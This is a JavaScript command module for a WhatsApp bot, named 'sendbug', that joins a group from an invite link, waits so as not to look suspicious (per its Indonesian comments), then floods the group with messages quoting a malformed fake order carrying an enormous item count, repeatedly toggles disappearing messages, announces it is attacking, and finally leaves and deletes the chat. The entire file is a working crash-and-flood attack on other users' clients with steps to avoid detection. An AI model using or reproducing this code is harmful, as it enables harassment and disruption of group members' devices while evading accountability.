let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i

let handler = async (m, { conn, text, usedPrefix, args }) => {
	let noPrefix = m.text.replace(usedPrefix, '')
	   let riff = noPrefix.trim().split`|`.slice(1)
	    let [_, code] = text.match(linkRegex) || []
	        if (!code) throw 'Link invalid'
	            let res = await conn.query({
	                    json: ["action", "invite", code]
	                        })
	          let chats = `${res.gid}`
	                            if (res.status !== 200) throw res
	                                m.reply(`tunggu 60 detik um,biar gak di curigai di gc id ini ${res.gid}`)
	                                    setTimeout(() => {
	                                    for (let i = 0; i < riff[0]; i++) {
	                                    	conn.sendMessage(`${res.gid}`, `wah troli`, m.mtype,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 9999999999999,
status: 1,
surface: 10,
orderTitle: 'Bug Tai',
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
     conn.toggleDisappearingMessages(`${res.gid}`)
      conn.toggleDisappearingMessages(`${res.gid}`)
       conn.toggleDisappearingMessages(`${res.gid}`)
        conn.toggleDisappearingMessages(`${res.gid}`)
         conn.toggleDisappearingMessages(`${res.gid}`)
         conn.sendMessage(`${res.gid}`, `wah troli`, m.mtype,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 9999999999999,
status: 1,
surface: 10,
orderTitle: 'Bug Tai',
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
         conn.toggleDisappearingMessages(`${res.gid}`)
      conn.sendMessage(m.chat, `siap ni um nyerang ${res.gid}`, m.mtype)
  }  }, 60000)
	                                    setTimeout(() => {
	                                    	conn.groupLeave(`${res.gid}`)
                                              for (let id of chats) {
                                               conn.modifyChat(`${res.gid}`, 'delete').catch(console.log)
                                              }
	                                    }, 120000)
	                                    }

	                                    handler.help = ['sendbug <chat.whatsapp.com>']
	                                    handler.tags = ['owner']

	                                    handler.command = /^sendbug$/i

	                                    handler.owner = true

	                                    handler.mods = false

	                                    handler.premium = false
	                                    handler.group = false
	                                    handler.private = false

	                                    handler.admin = false
	                                    handler.botAdmin = false

	                                    handler.fail = null

	                                    module.exports = handler

	            
